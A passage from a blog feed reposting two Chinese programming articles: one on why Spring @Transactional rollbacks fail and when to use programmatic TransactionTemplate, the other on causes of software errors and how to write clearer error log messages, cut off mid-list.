title="2.自己吞了异常"></a>2.自己吞了异常</h3><p>事务不会回滚，最常见的问题是：开发者在代码中手动try…catch了异常。比如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@Slf4j</span><br><span class="line">@Service</span><br><span class="line">public class UserService {</span><br><span class="line">    </span><br><span class="line">    @Transactional</span><br><span class="line">    public void add(UserModel userModel) {</span><br><span class="line">        try {</span><br><span class="line">            saveData(userModel);</span><br><span class="line">            updateData(userModel);</span><br><span class="line">        } catch (Exception e) {</span><br><span class="line">            log.error(e.getMessage(), e);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这种情况下spring事务当然不会回滚，因为开发者自己捕获了异常，又没有手动抛出，换句话说就是把异常吞掉了。</p><p>如果想要spring事务能够正常回滚，必须抛出它能够处理的异常。如果没有抛异常，则spring认为程序是正常的。</p><h3 id="3-手动抛了别的异常"><a href="#3-手动抛了别的异常" class="headerlink" title="3.手动抛了别的异常"></a>3.手动抛了别的异常</h3><p>即使开发者没有手动捕获异常，但如果抛的异常不正确，spring事务也不会回滚。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@Slf4j</span><br><span class="line">@Service</span><br><span class="line">public class UserService {</span><br><span class="line">    </span><br><span class="line">    @Transactional</span><br><span class="line">    public void add(UserModel userModel) throws Exception {</span><br><span class="line">        try {</span><br><span class="line">             saveData(userModel);</span><br><span class="line">             updateData(userModel);</span><br><span class="line">        } catch (Exception e) {</span><br><span class="line">            log.error(e.getMessage(), e);</span><br><span class="line">            throw new Exception(e);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>上面的这种情况，开发人员自己捕获了异常，又手动抛出了异常：Exception，事务同样不会回滚。</p><p>因为spring事务，默认情况下只会回滚<code>RuntimeException</code>（运行时异常）和<code>Error</code>（错误），对于普通的Exception（非运行时异常），它不会回滚。</p><h3 id="4-自定义了回滚异常"><a href="#4-自定义了回滚异常" class="headerlink" title="4.自定义了回滚异常"></a>4.自定义了回滚异常</h3><p>在使用@Transactional注解声明事务时，有时我们想自定义回滚的异常，spring也是支持的。可以通过设置<code>rollbackFor</code>参数，来完成这个功能。</p><p>但如果这个参数的值设置错了，就会引出一些莫名其妙的问题，例如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@Slf4j</span><br><span class="line">@Service</span><br><span class="line">public class UserService {</span><br><span class="line">    </span><br><span class="line">    @Transactional(rollbackFor = BusinessException.class)</span><br><span class="line">    public void add(UserModel userModel) throws Exception {</span><br><span class="line">       saveData(userModel);</span><br><span class="line">       updateData(userModel);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>如果在执行上面这段代码，保存和更新数据时，程序报错了，抛了SqlException、DuplicateKeyException等异常。而BusinessException是我们自定义的异常，报错的异常不属于BusinessException，所以事务也不会回滚。</p><p>即使rollbackFor有默认值，但阿里巴巴开发者规范中，还是要求开发者重新指定该参数。</p><p>这是为什么呢？</p><p>因为如果使用默认值，一旦程序抛出了Exception，事务不会回滚，这会出现很大的bug。所以，建议一般情况下，将该参数设置成：Exception或Throwable。</p><h3 id="5-嵌套事务回滚多了"><a href="#5-嵌套事务回滚多了" class="headerlink" title="5.嵌套事务回滚多了"></a>5.嵌套事务回滚多了</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public class UserService {</span><br><span class="line"></span><br><span class="line">    @Autowired</span><br><span class="line">    private UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    @Autowired</span><br><span class="line">    private RoleService roleService;</span><br><span class="line"></span><br><span class="line">    @Transactional</span><br><span class="line">    public void add(UserModel userModel) throws Exception {</span><br><span class="line">        userMapper.insertUser(userModel);</span><br><span class="line">        roleService.doOtherThing();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">@Service</span><br><span class="line">public class RoleService {</span><br><span class="line"></span><br><span class="line">    @Transactional(propagation = Propagation.NESTED)</span><br><span class="line">    public void doOtherThing() {</span><br><span class="line">        System.out.println("保存role表数据");</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这种情况使用了嵌套的内部事务，原本是希望调用roleService.doOtherThing方法时，如果出现了异常，只回滚doOtherThing方法里的内容，不回滚 userMapper.insertUser里的内容，即回滚保存点。。但事实是，insertUser也回滚了。</p><p>why?</p><p>因为doOtherThing方法出现了异常，没有手动捕获，会继续往上抛，到外层add方法的代理方法中捕获了异常。所以，这种情况是直接回滚了整个事务，不只回滚单个保存点。</p><p>怎么样才能只回滚保存点呢？</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@Slf4j</span><br><span class="line">@Service</span><br><span class="line">public class UserService {</span><br><span class="line"></span><br><span class="line">    @Autowired</span><br><span class="line">    private UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    @Autowired</span><br><span class="line">    private RoleService roleService;</span><br><span class="line"></span><br><span class="line">    @Transactional</span><br><span class="line">    public void add(UserModel userModel) throws Exception {</span><br><span class="line"></span><br><span class="line">        userMapper.insertUser(userModel);</span><br><span class="line">        try {</span><br><span class="line">            roleService.doOtherThing();</span><br><span class="line">        } catch (Exception e) {</span><br><span class="line">            log.error(e.getMessage(), e);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>可以将内部嵌套事务放在try/catch中，并且不继续往上抛异常。这样就能保证，如果内部嵌套事务中出现异常，只回滚内部事务，而不影响外部事务。</p><h2 id="三-其他"><a href="#三-其他" class="headerlink" title="三 其他"></a><strong>三 其他</strong></h2><h3 id="1-大事务问题"><a href="#1-大事务问题" class="headerlink" title="1 大事务问题"></a>1 大事务问题</h3><p>在使用spring事务时，有个让人非常头疼的问题，就是大事务问题。</p><p>通常情况下，我们会在方法上<code>@Transactional</code>注解，填加事务功能，比如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">@Service</span><br><span class="line">public class UserService {</span><br><span class="line">    </span><br><span class="line">    @Autowired </span><br><span class="line">    private RoleService roleService;</span><br><span class="line">    </span><br><span class="line">    @Transactional</span><br><span class="line">    public void add(UserModel userModel) throws Exception {</span><br><span class="line">       query1();</span><br><span class="line">       query2();</span><br><span class="line">       query3();</span><br><span class="line">       roleService.save(userModel);</span><br><span class="line">       update(userModel);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@Service</span><br><span class="line">public class RoleService {</span><br><span class="line">    </span><br><span class="line">    @Autowired </span><br><span class="line">    private RoleService roleService;</span><br><span class="line">    </span><br><span class="line">    @Transactional</span><br><span class="line">    public void save(UserModel userModel) throws Exception {</span><br><span class="line">       query4();</span><br><span class="line">       query5();</span><br><span class="line">       query6();</span><br><span class="line">       saveData(userModel);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>但<code>@Transactional</code>注解，如果被加到方法上，有个缺点就是整个方法都包含在事务当中了。</p><p>上面的这个例子中，在UserService类中，其实只有这两行才需要事务：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">roleService.save(userModel);</span><br><span class="line">update(userModel);</span><br></pre></td></tr></tbody></table></figure><p>在RoleService类中，只有这一行需要事务：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">saveData(userModel);</span><br></pre></td></tr></tbody></table></figure><p>现在的这种写法，会导致所有的query方法也被包含在同一个事务当中。</p><p>如果query方法非常多，调用层级很深，而且有部分查询方法比较耗时的话，会造成整个事务非常耗时，而从造成大事务问题。</p><p>关于大事务问题的危害，可以阅读一下我的另一篇文章《<a href="https://mp.weixin.qq.com/s?__biz=MzUxODkzNTQ3Nw==&amp;mid=2247485262&amp;idx=1&amp;sn=abe19452e4c13876270f329cc6929be7&amp;chksm=f9800194cef78882e5ad4d8eb00b7e3f745a4159aee6afb1858cc16cae599f8889afa330e17b&amp;token=305097496&amp;lang=zh_CN&amp;scene=21#wechat_redirect">让人头痛的大事务问题到底要如何解决？</a>》，上面有详细的讲解。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1040342123/640-20230824234734012.png" alt="Image"></p><h3 id="2-编程式事务"><a href="#2-编程式事务" class="headerlink" title="2.编程式事务"></a>2.编程式事务</h3><p>上面聊的这些内容都是基于<code>@Transactional</code>注解的，主要说的是它的事务问题，我们把这种事务叫做：<code>声明式事务</code>。</p><p>其实，spring还提供了另外一种创建事务的方式，即通过手动编写代码实现的事务，我们把这种事务叫做：<code>编程式事务</code>。例如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@Autowired</span><br><span class="line">private TransactionTemplate transactionTemplate;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">public void save(final User user) {</span><br><span class="line">      queryData1();</span><br><span class="line">      queryData2();</span><br><span class="line">      transactionTemplate.execute((status) =&gt; {</span><br><span class="line">         addData1();</span><br><span class="line">         updateData2();</span><br><span class="line">         return Boolean.TRUE;</span><br><span class="line">      })</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在spring中为了支持编程式事务，专门提供了一个类：TransactionTemplate，在它的execute方法中，就实现了事务的功能。</p><p>相较于<code>@Transactional</code>注解声明式事务，我更建议大家使用，基于<code>TransactionTemplate</code>的编程式事务。主要原因如下：</p><ol><li>避免由于spring aop问题，导致事务失效的问题。</li><li>能够更小粒度的控制事务的范围，更直观。</li></ol><blockquote><p>建议在项目中少使用@Transactional注解开启事务。但并不是说一定不能用它，如果项目中有些业务逻辑比较简单，而且不经常变动，使用@Transactional注解开启事务开启事务也无妨，因为它更简单，开发效率更高，但是千万要小心事务失效的问题。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 转载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何使错误日志更加方便排查问题</title>
      <link href="/posts/209595582/"/>
      <url>/posts/209595582/</url>
      
        <content type="html"><![CDATA[<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/209595582/640-20230824234051902.jpeg" alt="Image"></p><p>作者 | 琴水玉</p><p>来源 | <a href="https://cnblogs.com/lovesqcc/p/4319594.html">https://cnblogs.com/lovesqcc/p/4319594.html</a></p><p>在程序中打错误日志的主要目标是为更好地排查问题和解决问题提供重要线索和指导。但是在实际中打的错误日志内容和格式变化多样，错误提示上可能残缺不全、没有相关背景、不明其义，使得排查解决问题成为非常不方便或者耗时的操作。而实际上，如果编程的时候稍加用心，就会减少排查问题的很多无用功。 在阐述如何编写有效的错误日志之前， 了解错误是怎么产生的， 非常重要。</p><p><strong>错误是如何炼成的</strong></p><p>对于当前系统来说， 错误的产生由三个地方引入：</p><p>1.上层系统引入的非法参数。对于非法参数引入的错误， 可以通过参数校验和前置条件校验来截获错误；</p><p>2.与下层系统交互产生的错误。与下层交互产生的错误， 有两种：</p><p>a.下层系统处理成功了，但是通信出错了， 这样会导致子系统之间的数据不一致；</p><p>对于这种情况， 可以采用超时补偿机制，预先将任务记录下来，通过定时任务在后续将数据订正过来。</p><p>更好的设计方案 ？</p><p>b.通信成功了，但是下层处理出错了。</p><p>对于这种情况， 需要与下层开发人员沟通， 协调子系统之间的交互；</p><p>需要根据下层返回的错误码和错误描述做适当的处理或给予合理的提示信息。</p><p>无论哪一种情况， 都要假设下层系统可靠性一般， 做好出错的设计考虑。</p><p>3.本层系统处理出错。</p><p>本层系统产生错误的原因：</p><p><strong>原因一：疏忽导致。</strong> 疏忽是指程序员能力完全可避免此类错误但实际上没做到。比如将 &amp;&amp; 敲成了 &amp; ， == 敲成了 = ；边界错误， 复合逻辑判断错误等。疏忽要么是程序员注意力不够集中， 比如处于疲倦状态、加班通宵、边开会边写程序；要么是急着实现功能，没有顾及程序的健壮性等。</p><p>改进措施：使用代码静态分析工具，通过单元测试行覆盖可有效避免此类问题。</p><p><strong>原因二：错误与异常处理不够周全导致的。</strong> 比如输入问题。计算两个数相加， 不仅要考虑计算溢出问题， 还要考虑输入非法的情形。对于前者，可能通过了解、犯错或经验就可以避免， 而对于后者，则必须加以限定，以使之处于我们的智商能够控制的范围内，比如使用正则表达式过滤掉不合法的输入。对于正则表达式必须进行测试。对于不合法输入， 要给出尽可能详细、易懂、友好的提示信息、原因及建议方案。</p><p>改进措施：尽可能周全地考虑各种错误情形和异常处理。在实现主流程之后，增加一个步骤：仔细推敲可能的各种错误和异常，返回合理错误码和错误描述。每个接口或模块都有效处理好自己的错误和异常，可有效避免因场景交互复杂导致的bug. 譬如，一个业务用例由场景A.B.C交互完成。实际执行A.B成功了，C失败了，这时B需要根据C返回合理的代码和消息进行回滚并返回给A合理的代码和消息，A根据B的返回进行回滚，并返回给客户端合理的代码和消息。这是一种分段回滚的机制，要求每个场景都必须考虑异常情况下的回滚。</p><p><strong>原因三：逻辑耦合紧密导致。</strong> 由于业务逻辑耦合紧密， 随着软件产品一步步发展， 各种逻辑关系错综复杂， 难以看到全局状况， 导致局部修改影响波及到全局范围，造成不可预知的问题。</p><p>改进措施：编写短函数和短方法， 每个函数或方法最好不超过 50 行。编写无状态函数和方法， 只读全局状态， 相同的前提条件总是会输出相同的结果， 不会依赖外部状态而变更自己的行为；定义合理的结构、 接口和逻辑段， 使接口之间的交互尽可能正交、低耦合；对于服务层， 尽可能提供简单、正交的接口；持续重构， 保持应用模块化和松耦合， 理清逻辑依赖关系。对于有大量业务接口相互影响的情况， 必须整理各个业务接口的逻辑流程及相互依赖关系， 从整体上进行优化；对于有大量状态的实体， 也需要梳理相关的业务接口， 整理状态之间的转换关系。</p><p><strong>原因四：算法不正确导致。</strong></p><p>改进措施：首先将算法从应用中分离出来。若算法有多种实现， 可以通过交叉校验的单元测试找出来， 比如排序操作；如果算法具有可逆性质， 可以通过可逆校验的单元测试找出来， 比如加密解密操作。</p><p><strong>原因五：相同类型的参数，传入顺序错误导致。</strong> 比如，modifyFlow(int rx, int tx), 实际调用为 modifyFlow(tx,rx)</p><p>改进措施：尽可能使类型具体化， 该用浮点数就用浮点数， 该用字符串就用字符串， 该用具体对象类型就用具体对象类型；相同类型的参数尽可能错开；如果上述都无法满足， 就必须通过接口测试来验证， 接口参数值务必是不同的。</p><p><strong>原因六：空指针异常。</strong> 空指针异常通常是对象没有正确初始化， 或者使用对象之前没有对对象是否非空做检测。</p><p>改进措施：对于配置对象， 检测其是否成功初始化；对于普通对象， 获取到实体对象使用之前， 检测是否非空。</p><p><strong>原因七：网络通信错误。</strong> 网络通信错误通常是因为网络延迟、阻塞或不通导致的错误。网络通信错误通常是小概率事件， 但小概率事件很可能会导致大面积的故障、 难以复现的BUG。</p><p>改进措施：在前一个子系统的结束点和后一个子系统的入口点分别打 INFO 日志。通过两者的时间差提供一点线索。</p><p><strong>原因八：事务与并发错误。</strong> 事务与并发结合在一起， 很容易产生非常难以定位的错误。</p><p>改进措施：对于程序中的并发操作， 涉及到共享变量及重要状态修改的， 要加 INFO 日志。更有效的做法？？？</p><p><strong>原因九：配置错误。</strong></p><p>改进措施：在启动应用或启动相应配置时， 检测所有的配置项， 打印相应的INFO日志， 确保所有配置都加载成功。</p><p><strong>原因十：业务不熟悉导致的错误。</strong> 在中大型系统， 部分业务逻辑和业务交互都比较复杂， 整个的业务逻辑可能存在于多个开发同学的大脑里， 每个人的认识都不是完整的。这很容易导致业务编码错误。</p><p>改进措施：通过多人讨论和沟通， 设计正确的业务用例， 根据业务用例来编写和实现业务逻辑；最终的业务逻辑和业务用例必须完整存档；在业务接口中注明该业务的前置条件、处理逻辑、后置校验和注意事项；当业务变化时， 需要同步更新业务注释；代码REVIEW。业务注释是业务接口的重要文档， 对业务理解起着重要的缓存作用。</p><p><strong>原因十一：设计问题导致的错误。</strong> 比如同步串行方式会有性能、响应慢的问题， 而并发异步方式可以解决性能、响应慢的问题， 但会带来安全、正确性的隐患。异步方式会导致编程模型的改变， 新增异步消息推送和接收等新的问题。使用缓存能够提高性能， 但是又会存在缓存更新的问题。</p><p>改进措施：编写和仔细评审设计文档。设计文档必须阐述背景、需求、所满足的业务目标、要达到的业务性能指标、可能的影响、设计总体思路、详细方案、预见该方案的优缺点及可能的影响；通过测试和验收， 确保改设计方案确实满足业务目标和业务性能指标。</p><p><strong>原因十二：未知细节问题导致的错误。</strong> 比如缓冲区溢出、 SQL 注入攻击。从功能上看是没有问题的， 但是从恶意使用上看， 是存在漏洞的。再比如， 选择 jackson 库做 JSON 字符串解析， 默认情况下， 当对象新增字段时会导致解析出错。必须在对象上加 @JsonIgnoreProperties(ignoreUnknown = true) 注解才能正确应对变化。如果选用其他 JSON 库就不一定有这个问题。</p><p>改进措施：一方面要通过经验积累， 另一方面， 考虑安全问题和例外情况， 选择成熟的经过严格测试的库。</p><p><strong>原因十三：随时间变化而出现的bug。</strong> 有些解决方案在过去看来是很不错的，但在当前或者未来的情景中可能变得笨拙甚至不中用，也是常见的事情。比如像加密解密算法， 在过去可能认为是完善的， 在破解之后就要慎重使用了。</p><p>改进措施：关注变化以及漏洞修复消息，及时修正过时的代码、库、行为。</p><p><strong>原因十四：硬件相关的错误。</strong> 比如内存泄露， 存储空间不足， OutOfMemoryError 等。</p><p>改进措施：增加对应用系统的 CPU / 内存 / 网络等重要指标的性能监控。</p><p>系统出现的常见错误：</p><p>1.实体在数据库中的记录不存在， 必须指明是哪个实体或实体标识；</p><p>2.实体配置不正确， 必须指明是哪个配置有问题，正确的配置应该是什么；</p><p>3.实体资源不满足条件， 必须指明当前资源是什么，资源要求是什么；</p><p>4.实体操作前置条件不满足， 必须指明需要满足什么前置条件，当前的状态是什么；</p><p>5.实体操作后置校验不满足， 必须指明需要满足什么后置校验， 当前的状态是什么；</p><p>6.性能问题导致超时， 必须指明是什么导致的性能问题，后续如何优化；</p><p>7.多个子系统交互通信出错导致之间的状态或数据不一致？</p><p>一般难以定位的错误会出现在比较底层的地方。因为底层无法预知具体的业务场景， 给出的错误消息都是比较通用的。</p><p>这就要求在业务上层提供尽可能丰富的线索。错误的产生一定是多个系统或层次交互的过程中在某一层栈上不满足前置条件导致。在编程时， 在每一层栈中尽可能确保所有必须的前置条件满足，尽可能避免错误的参数传递到底层， 尽可能地将错误截获在业务层。</p><p>大多数错误都是由多种原因组合产生。但每一种错误必定有其原因。在解决错误之后， 要深入分析错误是如何发生的， 如何避免这些错误再次发生。努力就能成功， 但是： <strong>反思才能进步 ！</strong></p><p><strong>如何编写更容易排查问题的错误日志</strong></p><p>打错误日志的基本原则：</p><p>1.尽可能完整。每一条错误日志都完整描述了：什么场景下发生了什么错误， 什么原因（或者哪些可能原因）， 如何解决（或解决提示）；</p><p>2.尽可能具体。比如 NC 资源不足， 究竟具体指什么资源不足， 是否可以通过程序直接指明；通用错误，比如 VM NOT EXIST ， 要指明在什么场景下发生的，可能便于后续统计的工作。</p><p>3.尽可能直接。最理想的错误日志应该让人在第一直觉下能够知道是什么原因导致，该怎么去解决，而不是还要通过若干步骤去查找真正的原因。</p><p>4.将已有经验集成直接到系统中。所有已经解决过的问题及经验都要尽可能以友好的方式集成到系统中，给新进人员更好的提示，而不是埋藏在其他地方。</p><p>5.排版要整洁有序， 格式统一化规范化。密密麻麻、随笔式的日志看着就揪心， 相当不友好， 也不便于排查问题。</p><p>6.采用多个关键字唯一标识请求，突出显示关键字：时间、实体标识（比如vmname）、操作名称。</p><p>排查问题的基本步骤：</p><p>登录到应用服务器 -&gt; 打开日志文件 -&gt; 定位到错误日志位置 -&gt; 根据错误日志的线索的指导去排查、确认问题和解决问题。</p><p>其中：</p><p>1.从登陆到打开日志文件：由于应用服务器有多台， 要逐一登录上去查看实在不方便。需要编写一个工具放在 AG 上直接在 AG 上查看所有服务器日志， 甚至直接筛选出所需要的错误日志。</p><p>2.定位错误日志位置。目前日志的排版密密麻麻，不易定位到错误日志。一般可以先采用”时间”来定位到错误日志的附近前面的地方， 然后使用 实体关键字 / 操作名称 组合来锁定错误日志地方。根据 requestId 定位错误日志虽然比较符合传统，但是要先找到 requestId , 并且不具有描述性。最好能直接根据时间/内容关键字来定位错误日志位置。</p><p>3.分析错误日志。错误日志的内容最好能够更加直接明了， 能够明确指明与当前要排查的问题特征是吻合的， 并且给出重要线索。</p><p>通常， 程序错误日志的问题就是日志内容是针对当前代码情境才能理解，看上去简洁， 但总是写的不全， 半英文格式；一旦离开代码情境， 就很难知道究竟说的是什么， 非要让人思考一下或者去看看代码才能明白日志说的是什么含义。这不是自己给自己罪受？</p><p>比如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if ((storageType == StorageType.dfs1 || storageType == StorageType.dfs2)</span><br><span class="line">                &amp;&amp; (zone.hasStorageType(StorageType.io3) || zone.hasStorageType(StorageType.io4))) {</span><br><span class="line">// 进入dfs1 和dfs2 在io3 io4 存储。</span><br><span class="line">} else {</span><br><span class="line">      log.info("zone storage type not support, zone: " + zone.getZoneId() + ", storageType: "</span><br><span class="line">+ storageType.name());</span><br><span class="line">      throw new BizException(DeviceErrorCode.ZONE_STORAGE_TYPE_NOT_SUPPORT);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>zone 要支持什么 storage type 才是正确的? Do Not Let Me Think !</p><p>错误日志应该做到：即使离开代码情境，也能清晰地描述发生了什么。</p><p>此外，如果能够直接在错误日志中说明清楚原因， 在做巡检日志的时候也可以省些力气。</p><p>从某种意义上来说， 错误日志也可以是一种非常有益的文档，记录着各种不合法的运行用例。</p><p>目前程序错误日志的内容可能存在如下问题：</p><p><strong>1. 错误日志没有指明错误参数和内容：</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">catch(Exception ex){</span><br><span class="line">      log.error("control ip insert failed", ex);</span><br><span class="line">      return new ResultSet&lt;AddControlIpResponse&gt;(</span><br><span class="line">ControlIpErrorCode.ERROR_CONTROL_IP_INSERT_FAILURE);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>没有指明插入失败的 control ip. 如果加上 control ip 关键字， 更容易搜索和锁定错误。</p><p>类似的还有：</p><p>log.error(“Get some errors when insert subnet and its IPs into database. Add subnet or IP failure.”, e);</p><p>没有指明是哪个 subnet 的它下属的哪些 IP. 值得注意的是， 要指明这些要额外做一些事情， 可能会稍微影响性能。这时候需要权衡性能和可调试性。</p><p>解决方案：使用 String.format(“Some msg to ErrorObj: %s”, errobj) 方法指明错误参数及内容。</p><p>这通常要求对 DO 对象编写可读的 toString 方法。</p><p><strong>2. 错误场景不明确：</strong></p><p>log.error(“nc has exist, nc ip” + request.getIp());</p><p>在 createNc 中检测到 NC 已经存在报错。但是日志上没有指明错误场景， 让人猜测，为什么会报NC已存在错误。</p><p>可以改为</p><p>log.error(“nc has exist when want to create nc, please check nc parameters. Given nc ip: “ + request.getIp());</p><p>log.error(“[create nc] nc has exist, please check nc parameters. Given nc ip: “ + request.getIp());</p><p>类似的还有：</p><p>log.error(“not all vm destroyed, nc id “ + request.getNcId());</p><p>改成 log.error(“[delete nc] some vms [%s] in the nc are not destroyed. nc id: %s”, vmNames, request.getNcId());</p><p>解决方案：错误消息加上 when 字句， 或者错误消息前加上 【接口名】, 指明错误场景，直接从错误日志就知道明白了。</p><p>一般能够知道 executor 的可以加上 【接口名】， service 加上 when 字句。</p><p><strong>3. 内容不明确, 或不明其义：</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(aliMonitorReporter == null) {</span><br><span class="line">        log.error("aliMonitorReporter is null!");</span><br><span class="line">} else {</span><br><span class="line">       aliMonitorReporter.attach(new ThreadPoolMonitor(namePrefix, asynTaskThreadPool.getThreadPoolExecutor()));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>改为：log.error(“aliMonitorReporter is null, probably not initialized properly, please check configuration in file xxx.”);</p><p>类似的还有：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (diskWbps == null &amp;&amp; diskRbps == null &amp;&amp; diskWiops == null    &amp;&amp; diskRiops == null) {</span><br><span class="line">      log.error("none of attribute is specified for modifying");</span><br><span class="line">      throw new BizException(DeviceErrorCode.NO_ATTRIBUTE_FOR_MODIFY);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>改为 log.error(“[modify disk attribute] None of [diskWbps,diskRbps,diskWiops,diskRiops] is specified for disk id:” + diskId);</p><p>解决方案：更清晰贴切地描述错误内容。</p><p><strong>4. 排查问题的引导内容不明确：</strong></p><p>log.error(“get gw group ip segment failed. zkPath: “ + LockResource.getGwGroupIpSegmnetLockPath(request.getGwGroupId()));</p><p>zkPath ? 如何去排查这个问题？我该去找谁？到哪里去查找更具体的线索？</p><p>解决方案：加上相应的背景知识和引导排查措施。</p><p><strong>5. 错误内容不够具体细致：</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (!ncResourceService.isNcResourceEnough(ncResourceDO,    vmResourceCondition)) {</span><br><span class="line">      log.error("disk space is not enough at vm's nc, nc id:" + vmDO.getNcId());</span><br><span class="line">      throw new BizException(ResourceErrorCode.ERROR_RESOURCE_NOT_ENOUGH);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>究竟是什么资源不够？目前剩余多少？现在需要多少？值得注意的是， 要指明这些要额外做一些事情， 可能会稍微影响性能。这时候需要权衡性能和可调试性。</p><p>解决方案：通过改进程序或程序技巧， 尽可能揭示出具体的差异所在， 减少人工比对的操作。</p><p><strong>6. 